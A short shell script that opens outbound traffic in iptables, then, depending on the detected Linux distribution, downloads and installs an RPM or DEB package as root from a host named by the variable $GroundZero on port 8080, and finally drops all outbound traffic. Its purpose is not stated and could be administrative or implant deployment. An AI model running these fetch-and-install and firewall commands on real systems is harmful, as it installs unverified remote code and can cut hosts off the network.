#!/bin/sh

ipt=$(command -v iptables || command -v /sbin/iptables || command -v /usr/sbin/iptables)

$ipt -P OUTPUT ACCEPT
RHEL_SYSTEMD(){
    yum install http://$GroundZero:8080/newrpm.rpm -y
    echo $(hostname) "installed"
}

RHEL_SYSV(){
    yum install http://$GroundZero:8080/oldrpm.rpm -y
    echo $(hostname) "installed"
}

DEB_SYSTEMD(){
    apt-get update -y -qq && apt-get install wget -y -qq
    wget $GroundZero:8080/newdeb.deb -O /tmp/newdeb.deb
    dpkg -i /tmp/newdeb.deb
    echo $(hostname) "installed"
}

DEB_SYSV(){
    echo $(hostname) "old debian"
}

ALPINE(){
    echo $(hostname) "alpine"
}

SLACK(){
    echo $(hostname) "slack"
}

if command -v yum >/dev/null ; then
    if command -v systemctl >/dev/null; then
        RHEL_SYSTEMD
    else
        RHEL_SYSV
    fi
elif command -v apt-get >/dev/null ; then
    if command -v systemctl >/dev/null ; then
        DEB_SYSTEMD
    else
        DEB_SYSV
    fi
elif command -v apk >/dev/null ; then
    ALPINE
elif command -v slapt-get >/dev/null || (cat /etc/os-release | grep -i slackware) ; then
    SLACK
fi

$ipt -P OUTPUT DROP
